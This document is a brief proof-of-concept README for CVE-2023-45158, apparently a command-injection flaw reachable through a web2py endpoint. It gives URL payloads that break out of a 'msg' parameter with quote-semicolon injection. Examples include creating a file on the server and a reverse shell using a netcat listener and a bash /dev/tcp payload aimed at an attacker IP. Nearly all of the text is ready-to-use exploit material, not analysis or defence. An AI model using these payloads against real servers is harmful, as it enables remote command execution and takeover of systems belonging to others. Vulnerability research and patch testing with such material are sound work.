# CVE-2023-45158

# Steps
1. Run the webserver
```bash
cd web2py
python3 web2py.py
```

2. Inject your command using the URL ``http://<IP-ADDRESS>:8000/hack?msg=%27%3B<YOUR-COMMAND>%3B%27``. Replace ``<IP-ADDRESS>`` and ``<YOUR-COMMAND>`` with your values.

# Examples
1. Create a file on the server

``http://<IP-ADDRESS>:8000/hack?msg=%27%3Btouch%20hack%3B%27``

2. Reverse shell

On the attacker's machine, run ``nc -l 127.0.0.1 8080``

Go to URL ``http://<IP-ADDRESS>:8000/hack?msg=%27%3Bbash%20-i%20>%26/dev/tcp/<ATTACKER-IP>/8080%200>%26%201%3B%27``. Replace ``<ATTACKER-IP>``.
